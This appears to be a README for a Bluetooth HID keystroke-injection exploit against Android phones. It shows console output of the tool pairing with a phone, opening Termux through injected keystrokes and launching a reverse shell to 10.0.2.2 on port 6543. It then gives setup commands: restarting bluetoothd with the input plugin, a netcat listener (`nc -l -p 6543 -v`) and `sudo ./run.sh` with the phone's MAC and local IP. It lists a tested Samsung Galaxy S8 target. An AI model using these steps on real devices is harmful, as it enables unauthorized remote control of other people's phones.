```
[*] Reverse shell built for 10.0.2.2 on 6543
[*] Pairing to 08:AE:D6:6F:DD:F8
[!] Paired 08:AE:D6:6F:DD:F8 to DC:53:60:6C:FC:B3
[*] Prepped to send HID shellcode, using finder to find termux, then termux to pop a reverse shell from 08:AE:D6:6F:DD:F8...
[!] Go to another terminal and start a netcat listener on port 6543 to handle the shell!
[*] Registered HID profile
[!] Ready, waiting for connection from phone
[*] Control channel connected to 08:AE:D6:6F:DD:F8
[*] Interrupt channel connected to 08:AE:D6:6F:DD:F8
[*] Trying to attain control over device...
[*] Sending back to home screen
[*] Trying to pull up finder...
[*] Trying to find termux...
[*] Pushing shellcode now...
[!] Check your netcat listener for a shell!
[!] Exploit finished.
```


*setup*

Need to run `sudo systemctl stop bluetooth`, then run: `bluetoothd -P input`.

Start a netcat listener on 6543 on your local machine: `nc -l -p 6543 -v`

Now pair the device, and: `sudo ./run.sh [phone bt mac] [local ip addr]`.  Now on the phone, tap on the computer's controller alias in the bluetooth screen, and the exploit should proceed.

With a little luck, you'll see a shell from the phone pop up in netcat within about a minute.

**Tested on:**

*linux kernel 6.1.12, bluetoothd 5.66, python libraries: python-xlib 0.27, dbus-python 1.2.16*

*Samsung Galaxy S8 running android 9, termux installed.*

Have fun, and be safe!
